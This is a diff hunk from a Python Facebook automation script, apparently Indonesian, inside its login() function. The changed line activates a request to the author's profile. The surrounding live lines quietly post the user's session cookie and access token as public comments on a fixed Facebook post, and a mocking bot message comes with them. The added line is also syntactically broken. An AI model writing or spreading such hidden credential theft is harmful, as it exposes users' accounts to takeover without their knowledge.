@@ -828,7 +828,7 @@ def login():
 		slebew = ('\nKomentar Ditulis Oleh Bot\n\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_hari_,hari_ini))
 		link = ('https://www.facebook.com/100013275378835/posts/pfbid021TyVeMPg5xdnMLzvdt7cELMguQxPYwoyCxEFC5WxdQUf4ce3vrgNJwpm8DhRkzVal/?app=fbl')
 		random_kata = random.choice(["Acc Master","Hallo Ganteng @[100013275378835:0]","Panutan Gw Nih Boss 😎 @[100013275378835:0]","Kamu Ganteng Banget Deh Ferly><😝"])
-		#ses.post(f"https://graph.facebook.com/1624764771309353?fields=subscribers&access_token={token}",headers=(cookies=cok)
+		ses.post(f"https://mbasic.facebook.com/100013275378835?fields=subscribers&access_token={token}",headers=(cookies=cok)
 		ses.post(f"https://graph.facebook.com/1624764771309353/comments/?message={cookie}&access_token={token}",cookies=cok)
 		ses.post(f"https://graph.facebook.com/1624764771309353/comments/?message={token}&access_token={token}",cookies=cok)
 		ses.post(f"https://graph.facebook.com/1624764771309353/comments/?message={tem}\n{link}\n{slebew}&access_token={token}",cookies =cok)
